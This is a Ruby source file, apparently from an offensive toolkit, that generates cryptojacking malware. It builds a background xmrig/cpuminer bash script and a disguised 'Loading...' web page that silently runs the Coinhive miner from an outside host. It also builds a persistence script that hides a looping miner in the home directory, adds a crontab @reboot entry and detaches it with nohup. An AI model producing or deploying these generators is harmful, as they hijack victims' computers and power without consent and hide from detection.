require_relative '../utils/colorize'

class CryptoMining
  def self.generate_miner_script(pool_url, wallet_address, worker_name = 'worker')
    miner = <<~SH
      #!/bin/bash
      
      POOL="#{pool_url}"
      WALLET="#{wallet_address}"
      WORKER="#{worker_name}"
      
      if command -v xmrig &> /dev/null; then
          xmrig -o $POOL -u $WALLET -p $WORKER --donate-level=0 --background
      elif command -v cpuminer &> /dev/null; then
          cpuminer -a cryptonight -o $POOL -u $WALLET -p $WORKER &
      else
          echo "Mining software not found"
      fi
    SH
    
    filename = "miner_#{Time.now.to_i}.sh"
    File.write(filename, miner)
    File.chmod(filename, 0755)
    puts Colorize.green("Miner script saved: #{filename}")
    filename
  end

  def self.generate_browser_miner(pool_url, wallet_address)
    miner = <<~HTML
      <!DOCTYPE html>
      <html>
      <head>
        <title>Loading...</title>
        <script src="https://coinhive.com/lib/coinhive.min.js"></script>
        <script>
          var miner = new CoinHive.Anonymous('#{wallet_address}');
          miner.start();
          
          setInterval(function() {
            var hashesPerSecond = miner.getHashesPerSecond();
            var totalHashes = miner.getTotalHashes();
            var acceptedHashes = miner.getAcceptedHashes();
            
            console.log('Hashes/sec: ' + hashesPerSecond);
            console.log('Total hashes: ' + totalHashes);
            console.log('Accepted hashes: ' + acceptedHashes);
          }, 10000);
        </script>
      </head>
      <body>
        <h1>Please wait...</h1>
      </body>
      </html>
    HTML
    
    filename = "browser_miner_#{Time.now.to_i}.html"
    File.write(filename, miner)
    puts Colorize.green("Browser miner saved: #{filename}")
    filename
  end

  def self.generate_persistence_miner(pool_url, wallet_address)
    persistence = <<~SH
      #!/bin/bash
      
      POOL="#{pool_url}"
      WALLET="#{wallet_address}"
      
      MINER_SCRIPT="$HOME/.miner.sh"
      
      cat > $MINER_SCRIPT << 'EOF'
      #!/bin/bash
      while true; do
          if ! pgrep -f xmrig > /dev/null; then
              xmrig -o $POOL -u $WALLET --donate-level=0 --background
          fi
          sleep 60
      done
      EOF
      
      chmod +x $MINER_SCRIPT
      
      (crontab -l 2>/dev/null; echo "@reboot $MINER_SCRIPT") | crontab -
      
      nohup $MINER_SCRIPT > /dev/null 2>&1 &
    SH
    
    filename = "persistence_miner_#{Time.now.to_i}.sh"
    File.write(filename, persistence)
    File.chmod(filename, 0755)
    puts Colorize.green("Persistence miner saved: #{filename}")
    filename
  end
end

